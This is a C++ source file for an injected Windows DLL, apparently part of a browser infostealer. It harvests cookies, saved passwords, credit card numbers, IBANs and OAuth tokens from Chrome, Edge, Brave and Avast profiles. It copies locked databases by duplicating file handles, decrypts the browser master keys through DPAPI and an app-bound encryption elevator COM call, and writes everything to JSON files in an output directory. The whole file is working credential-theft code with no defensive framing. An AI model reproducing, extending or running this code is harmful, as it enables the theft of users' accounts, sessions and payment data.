// Win7 SP1 compatibility – must appear before every Windows/CRT header.
#undef  _WIN32_WINNT
#undef  WINVER
#undef  NTDDI_VERSION
#define _WIN32_WINNT      0x0601
#define WINVER            0x0601
#define NTDDI_VERSION     0x06010000
#ifndef _USING_V110_SDK71_
#define _USING_V110_SDK71_
#endif

#include "../core/common.hpp"
#include "../payload/pipe_client.hpp"
#include "../payload/handle_duplicator.hpp"
#include "../payload/extra_extractor.hpp"
#include <windows.h>
#include <shlobj.h>
#include <fstream>
#include <filesystem>
#include <vector>
#include <string>
#include <sstream>
#include <iomanip>
#include <memory>
#include "sqlite3.h"
#include <nlohmann/json.hpp>
#include "../com/elevator.hpp"
#include "../crypto/aes_gcm.hpp"
#include "../crypto/key_derivation.hpp"
#include "browser_config.hpp"
#include <iostream>

#pragma comment(lib, "crypt32.lib")

using json = nlohmann::json;
using namespace Payload;

static void RawTrace(const char* msg) { (void)msg; }

struct BrowserPaths {
    std::wstring name;
    std::wstring userDataPath;
};

static BrowserPaths GetBrowserPaths(const std::string& browserType) {
    std::wstring wType = Core::ToWide(browserType);
    wchar_t localAppData[MAX_PATH] = { 0 };
    if (SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData) != S_OK) {
        if (GetEnvironmentVariableW(L"LOCALAPPDATA", localAppData, MAX_PATH) == 0)
            wcscpy_s(localAppData, L"C:\\Users\\Default\\AppData\\Local");
    }
    std::wstring base(localAppData);
    BrowserPaths bp;
    if (wType == L"chrome") { bp.name = L"Chrome";               bp.userDataPath = base + L"\\Google\\Chrome\\User Data"; }
    else if (wType == L"edge") { bp.name = L"Edge";                 bp.userDataPath = base + L"\\Microsoft\\Edge\\User Data"; }
    else if (wType == L"brave") { bp.name = L"Brave";                bp.userDataPath = base + L"\\BraveSoftware\\Brave-Browser\\User Data"; }
    else if (wType == L"avast") { bp.name = L"Avast Secure Browser"; bp.userDataPath = base + L"\\AVAST Software\\Browser\\User Data"; }
    else { bp.name = L"Chromium";             bp.userDataPath = base + L"\\Google\\Chrome\\User Data"; }
    return bp;
}

static std::string ToBase64(const std::vector<uint8_t>& data) {
    if (data.empty()) return "";
    DWORD size = 0;
    CryptBinaryToStringA(data.data(), (DWORD)data.size(),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &size);
    std::string result(size, '\0');
    CryptBinaryToStringA(data.data(), (DWORD)data.size(),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &result[0], &size);
    if (!result.empty() && result.back() == '\0') result.pop_back();
    return result;
}

static std::string EscapeJson(const std::string& s) {
    std::ostringstream o;
    for (char c : s) {
        switch (c) {
        case '"':  o << "\\\""; break;
        case '\\': o << "\\\\"; break;
        case '\b': o << "\\b";  break;
        case '\f': o << "\\f";  break;
        case '\n': o << "\\n";  break;
        case '\r': o << "\\r";  break;
        case '\t': o << "\\t";  break;
        default:
            if (static_cast<unsigned char>(c) < 0x20)
                o << "\\u" << std::hex << std::setw(4) << std::setfill('0') << static_cast<int>(c);
            else o << c;
        }
    }
    return o.str();
}

static sqlite3* OpenDatabaseDirect(const std::filesystem::path& dbPath) {
    sqlite3* db = nullptr;
    std::string uri = "file:" + dbPath.string() + "?nolock=1";
    if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, nullptr) == SQLITE_OK)
        return db;
    if (db) sqlite3_close(db);
    return nullptr;
}

static std::vector<uint8_t> GetEncryptedKeyByName(const std::filesystem::path& localState,
    const std::string& keyName, std::string* errorMsg = nullptr)
{
    std::ifstream f(localState, std::ios::binary);
    if (!f) { if (errorMsg) *errorMsg = ""; return {}; }
    std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
    std::string tag = "\"" + keyName + "\":\"";
    std::cout << "[src/payload/collector_payload] [+] keyName  : " << keyName << "\n";
    size_t pos = content.find(tag);
    if (pos == std::string::npos) { if (errorMsg) *errorMsg = ""; return {}; }
    pos += tag.length();
    size_t end = content.find('"', pos);
    if (end == std::string::npos) { if (errorMsg) *errorMsg = ""; return {}; }
    std::string b64 = content.substr(pos, end - pos);
    DWORD size = 0;
    CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr);
    if (size < 5) { if (errorMsg) *errorMsg = ""; return {}; }
    std::vector<uint8_t> data(size);
    CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, data.data(), &size, nullptr, nullptr);
    return std::vector<uint8_t>(data.begin() + 4, data.end());
}

static const std::vector<BYTE> LEGACY_ENTROPY = { 'G', 'B', 'P' };

static std::vector<uint8_t> GetDPAPIKeyBlob(const std::filesystem::path& localState) {
    std::ifstream f(localState, std::ios::binary);
    if (!f) return {};
    std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
    std::string tag = "\"encrypted_key\":\"";
    size_t pos = content.find(tag);
    if (pos == std::string::npos) return {};
    pos += tag.length();
    size_t end = content.find('"', pos);
    if (end == std::string::npos) return {};
    std::string b64 = content.substr(pos, end - pos);
    DWORD size = 0;
    if (!CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr))
        return {};
    std::vector<uint8_t> data(size);
    if (!CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, data.data(), &size, nullptr, nullptr))
        return {};
    return data;
}

static std::string DecryptDPAPIKey(const std::vector<uint8_t>& fullBlob, PipeClient& pipe) {
    (void)pipe;
    if (fullBlob.empty()) return "";

    DATA_BLOB in = { static_cast<DWORD>(fullBlob.size()), const_cast<BYTE*>(fullBlob.data()) };
    DATA_BLOB out = { 0, nullptr };

    if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) {
        std::string decrypted(reinterpret_cast<char*>(out.pbData), out.cbData);
        LocalFree(out.pbData);
        std::string hex;
        hex.reserve(decrypted.size() * 2);
        for (unsigned char c : decrypted) { char buf[3]; sprintf_s(buf, "%02X", c); hex += buf; }
        std::cout << "[src/payload/collector_payload] [+] [1] hex : ";

        for (const auto& b : hex)
        {
            std::cout << std::hex
                << std::setw(2)
                << std::setfill('0')
                << static_cast<unsigned int>(b);
        }

        std::cout << std::dec << '\n';
        return hex;
    }

    DATA_BLOB entropy = { static_cast<DWORD>(LEGACY_ENTROPY.size()), const_cast<BYTE*>(LEGACY_ENTROPY.data()) };
    if (CryptUnprotectData(&in, nullptr, &entropy, nullptr, nullptr, 0, &out)) {
        std::string decrypted(reinterpret_cast<char*>(out.pbData), out.cbData);
        LocalFree(out.pbData);
        std::string hex;
        hex.reserve(decrypted.size() * 2);
        for (unsigned char c : decrypted) { char buf[3]; sprintf_s(buf, "%02X", c); hex += buf; }
        std::cout << "[src/payload/collector_payload] [+] [2] hex  : " << hex << "\n";

        return hex;
    }

    return "";
}

static std::string DecryptDPAPIKey(const std::vector<uint8_t>& fullBlob) {
    if (fullBlob.empty()) return "";
    DATA_BLOB in = { static_cast<DWORD>(fullBlob.size()), const_cast<BYTE*>(fullBlob.data()) };
    DATA_BLOB out = { 0, nullptr };
    if (!CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) return "";
    std::string decrypted(reinterpret_cast<char*>(out.pbData), out.cbData);
    LocalFree(out.pbData);
    std::string hex;
    hex.reserve(decrypted.size() * 2);
    for (unsigned char c : decrypted) { char buf[3]; sprintf_s(buf, "%02X", c); hex += buf; }
    std::cout << "[src/payload/collector_payload] [+] [3] hex  : " << hex << "\n";

    return hex;
}

static std::string DecryptAbeKey(const std::vector<uint8_t>& encryptedKey, const std::string& browserType) {
    try {
        auto configs = GetConfigs();
        auto it = configs.find(browserType);
        if (it == configs.end()) return "";
        const auto& cfg = it->second;
        Com::Elevator elevator;
        std::vector<uint8_t> decrypted = elevator.DecryptKey(
            encryptedKey, cfg.clsid, cfg.iid, cfg.iid_v2,
            cfg.name == "Edge", cfg.name == "Avast");
        std::cout << "[src/payload/collector_payload] [+] encryptedKey : " << std::flush;
        for (const auto& b : encryptedKey)
        {
            std::cout << std::hex
                << std::setw(2)
                << std::setfill('0')
                << static_cast<unsigned int>(b);
        }

        std::cout << std::dec << std::endl;

        std::cout << "[src/payload/collector_payload] [+] decrypted : " << std::endl;

        for (const auto& b : decrypted)
        {
            std::cout << std::hex
                << std::setw(2)
                << std::setfill('0')
                << static_cast<unsigned int>(b);
        }

        std::cout << std::dec << '\n';

        if (decrypted.empty()) return "";
        std::string hex;
        hex.reserve(decrypted.size() * 2);
        for (uint8_t b : decrypted) { char buf[3]; sprintf_s(buf, "%02X", b); hex += buf; }
        return hex;
    }
    catch (...) { return ""; }
}

static void CollectProfileDataToJson(const std::filesystem::path& profilePath,
    json& outArray, PipeClient& pipe)
{
    (void)pipe;
    HandleDuplicator duplicator;
    std::vector<std::filesystem::path> tempFiles;

    auto openDb = [&](const std::filesystem::path& p) -> sqlite3* {
        sqlite3* db = OpenDatabaseDirect(p);
        if (db) return db;
        auto tmp = duplicator.CopyLockedFile(p, std::filesystem::temp_directory_path());
        if (tmp) { tempFiles.push_back(*tmp); return OpenDatabaseDirect(*tmp); }
        return nullptr;
        };

    auto processTable = [&](sqlite3* db, const std::string& query,
        const std::vector<std::string>& columnNames,
        const std::string& titlePrefix,
        const std::string& filePath)
        {
            sqlite3_stmt* stmt = nullptr;
            if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, nullptr) != SQLITE_OK) return;
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                std::string title = titlePrefix;
                for (size_t i = 0; i < columnNames.size() - 1; ++i) {
                    const unsigned char* text = sqlite3_column_text(stmt, (int)i);
                    if (text) {
                        if (!title.empty() && title.back() != ':') title += " ";
                        title += (const char*)text;
                    }
                }
                int blobIdx = (int)columnNames.size() - 1;
                const void* blob = sqlite3_column_blob(stmt, blobIdx);
                int blobLen = sqlite3_column_bytes(stmt, blobIdx);
                if (blob && blobLen > 0) {
                    std::vector<uint8_t> encrypted((uint8_t*)blob, (uint8_t*)blob + blobLen);
                    json entry;
                    entry["title"] = title;
                    entry["path"] = filePath;
                    entry["encrypted_text"] = ToBase64(encrypted);
                    entry["related_dpapi"] = "";
                    entry["related_abe"] = "";
                    outArray.push_back(entry);
                }
            }
            sqlite3_finalize(stmt);
        };

    auto cookiePath = profilePath / "Network" / "Cookies";
    if (std::filesystem::exists(cookiePath))
        if (auto* db = openDb(cookiePath)) {
            processTable(db, "SELECT host_key, name, path, encrypted_value FROM cookies",
                { "host_key", "name", "path", "encrypted_value" }, "cookie: ", cookiePath.string());
            sqlite3_close(db);
        }

    auto loginPath = profilePath / "Login Data";
    if (std::filesystem::exists(loginPath))
        if (auto* db = openDb(loginPath)) {
            processTable(db, "SELECT origin_url, username_value, password_value FROM logins",
                { "origin_url", "username_value", "password_value" }, "password: ", loginPath.string());
            sqlite3_close(db);
        }

    auto webDataPath = profilePath / "Web Data";
    if (std::filesystem::exists(webDataPath))
        if (auto* db = openDb(webDataPath)) {
            processTable(db, "SELECT name_on_card, card_number_encrypted FROM credit_cards",
                { "name_on_card", "card_number_encrypted" }, "card: ", webDataPath.string());
            processTable(db, "SELECT nickname, value_encrypted FROM local_ibans",
                { "nickname", "value_encrypted" }, "iban: ", webDataPath.string());
            processTable(db, "SELECT service, encrypted_token FROM token_service",
                { "service", "encrypted_token" }, "token: ", webDataPath.string());
            sqlite3_close(db);
        }

    for (const auto& tmp : tempFiles) {
        try { std::filesystem::remove(tmp); }
        catch (...) {}
    }
}

static DWORD DoWork(PipeClient& pipe, const PipeClient::Config& config) {
    try {
        BrowserPaths bp = GetBrowserPaths(config.browserType);

        if (!Sys::InitApi(config.verbose))
            return 1;

        std::filesystem::path userDataPath(bp.userDataPath);
        std::filesystem::path localStatePath = userDataPath / L"Local State";
        std::filesystem::path outputDir(config.outputPath);
        std::filesystem::create_directories(outputDir);
        std::filesystem::path jsonPath = outputDir / "answer.json";

        json root;
        if (std::filesystem::exists(jsonPath)) {
            std::ifstream existingFile(jsonPath);
            if (existingFile.is_open()) {
                try { root = json::parse(existingFile); }
                catch (...) { root = json::object(); }
            }
        }
        if (!root.is_object())          root = json::object();
        if (!root.contains("browsers")) root["browsers"] = json::object();
        if (!root.contains("entries"))  root["entries"] = json::array();

        std::string error;
        auto encAbeKey = GetEncryptedKeyByName(localStatePath, "app_bound_encrypted_key", &error);
        std::cout << "[src/payload/collector_payload] [+] encAbeKey : ";

        for (const auto& b : encAbeKey)
        {
            std::cout << std::hex
                << std::setw(2)
                << std::setfill('0')
                << static_cast<unsigned int>(b);
        }

        std::cout << std::dec << '\n';
        std::string encAbeBase64 = encAbeKey.empty() ? "" : ToBase64(encAbeKey);
        std::cout << "[src/payload/collector_payload] [+] encAbeBase64  : " << encAbeBase64 << "\n";

        std::string decAbeHex = encAbeKey.empty() ? "" : DecryptAbeKey(encAbeKey, config.browserType);
        std::cout << "[src/payload/collector_payload] [+] decAbeHex  : " << decAbeHex << "\n";

        auto dpapiFullBlob = GetDPAPIKeyBlob(localStatePath);
        std::cout << "[src/payload/collector_payload] [+] dpapiFullBlob : ";

        for (const auto& b : dpapiFullBlob)
        {
            std::cout << std::hex
                << std::setw(2)
                << std::setfill('0')
                << static_cast<unsigned int>(b);
        }

        std::cout << std::dec << '\n';
        std::string encDpapiBase64 = dpapiFullBlob.empty() ? "" : ToBase64(dpapiFullBlob);
        std::cout << "[src/payload/collector_payload] [+] encDpapiBase64  : " << encDpapiBase64 << "\n";

        std::string decDpapiHex = DecryptDPAPIKey(dpapiFullBlob, pipe);
        std::cout << "[src/payload/collector_payload] [+] decDpapiHex  : " << decDpapiHex << "\n";

        root["browsers"][config.browserType]["version"] = config.browserVersion;
        root["browsers"][config.browserType]["encrypted_abe"] = encAbeBase64;
        root["browsers"][config.browserType]["decrypted_abe"] = decAbeHex;
        root["browsers"][config.browserType]["encrypted_dpapi"] = encDpapiBase64;
        root["browsers"][config.browserType]["decrypted_dpapi"] = decDpapiHex;
        root["browsers"][config.browserType]["user_data_path"] = userDataPath.string();

        json newEntries = json::array();
        std::error_code ec;
        for (const auto& entry : std::filesystem::directory_iterator(userDataPath, ec)) {
            if (ec) break;
            if (entry.is_directory() &&
                (std::filesystem::exists(entry.path() / L"Network" / L"Cookies") ||
                    std::filesystem::exists(entry.path() / L"Login Data"))) {
                CollectProfileDataToJson(entry.path(), newEntries, pipe);
            }
        }

        for (auto& item : newEntries) {
            item["browser_id"] = config.browserType;
            item.erase("related_abe");
            item.erase("related_dpapi");
            root["entries"].push_back(item);
        }

        std::string jsonStr = root.dump(2);
        auto tmpPath = jsonPath.string() + ".tmp";
        HANDLE hFile = CreateFileA(tmpPath.c_str(), GENERIC_WRITE, 0, nullptr,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) {
            pipe.Log("FILE_WRITE_FAIL:answer.json - CreateFile failed");
            return 1;
        }
        DWORD written = 0;
        BOOL writeOk = WriteFile(hFile, jsonStr.c_str(), (DWORD)jsonStr.size(), &written, nullptr);
        CloseHandle(hFile);
        if (!writeOk || written != (DWORD)jsonStr.size()) {
            pipe.Log("FILE_WRITE_FAIL:answer.json - WriteFile failed");
            return 1;
        }
        if (!MoveFileExA(tmpPath.c_str(), jsonPath.string().c_str(), MOVEFILE_REPLACE_EXISTING)) {
            pipe.Log("FILE_WRITE_FAIL:answer.json - MoveFileEx failed");
            return 1;
        }

        pipe.Log("FILE_WRITE_OK:" + jsonPath.string());

        std::filesystem::path extraPath = outputDir / "extra.json";
        if (!std::filesystem::exists(extraPath)) {
            try {
                ExtraExtractor extras(pipe);
                extras.CollectAll();
                std::string extraJson = extras.GetSecretsJson();

                HANDLE hExtra = CreateFileW(extraPath.c_str(), GENERIC_WRITE, 0, nullptr,
                    CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
                if (hExtra != INVALID_HANDLE_VALUE) {
                    DWORD w = 0;
                    BOOL  ok = WriteFile(hExtra, extraJson.c_str(),
                        static_cast<DWORD>(extraJson.size()), &w, nullptr);
                    FlushFileBuffers(hExtra);
                    CloseHandle(hExtra);
                    if (!ok || w != static_cast<DWORD>(extraJson.size()))
                        DeleteFileW(extraPath.c_str());
                }
            }
            catch (...) {}
        }

        return 0;
    }
    catch (...) { return 1; }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);

        LPCWSTR pipeName = static_cast<LPCWSTR>(lpReserved);
        if (!pipeName) return FALSE;

        PipeClient pipe(pipeName);
        if (!pipe.IsValid()) return FALSE;

        auto config = pipe.ReadConfig();

        DoWork(pipe, config);

    }
    return TRUE;
}